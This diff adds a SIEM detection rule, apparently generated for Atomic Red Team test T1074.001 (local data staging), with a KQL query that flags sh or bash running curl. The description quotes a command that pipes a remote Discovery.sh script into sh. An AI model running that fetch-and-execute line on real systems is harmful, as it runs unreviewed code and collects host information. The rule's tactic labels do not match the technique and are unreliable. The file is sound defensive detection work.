@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Stage data from Discovery.sh' (GUID: 39ce0303-ae16-4b9e-bb5b-4f53e8262066) of technique T1074.001 (Data Staged: Local Data Staging). Test Description: Utilize curl to download discovery.sh and execute a basic information gathering shell script. Command/Steps: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n"
+from = "now-9m"
+rule_id = "ba5a6d8e-f341-4627-b921-ded0d22d6e21"
+language = "kql"
+name = "Atomic Test: T1074.001 - Stage data from Discovery.sh"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1074.001/T1074.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1074.001", "39ce0303-ae16-4b9e-bb5b-4f53e8262066", "linux", "macos",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*curl*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1074.001"
+name = "Stage data from Discovery.sh"
+reference = "https://attack.mitre.org/techniques/T1074/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1074/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1074/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1074/001"
+
+
